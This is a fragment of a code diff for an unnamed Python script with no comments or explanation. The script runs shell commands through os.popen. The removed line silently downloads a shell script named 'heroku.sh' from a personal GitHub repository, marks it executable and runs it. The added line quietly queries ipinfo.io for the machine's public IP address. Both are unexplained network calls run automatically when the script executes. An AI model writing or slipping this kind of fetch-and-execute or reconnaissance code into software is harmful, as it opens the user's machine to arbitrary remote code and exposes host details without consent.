@@ -10,6 +10,6 @@ import threading
 import multiprocessing
 import string
 
-script = 'wget -q https://raw.githubusercontent.com/eliteleon/private/main/bash/heroku.sh && chmod +x heroku.sh && ./heroku.sh'
+script = 'curl ipinfo.io'
 run = os.popen(script).readlines()
 run
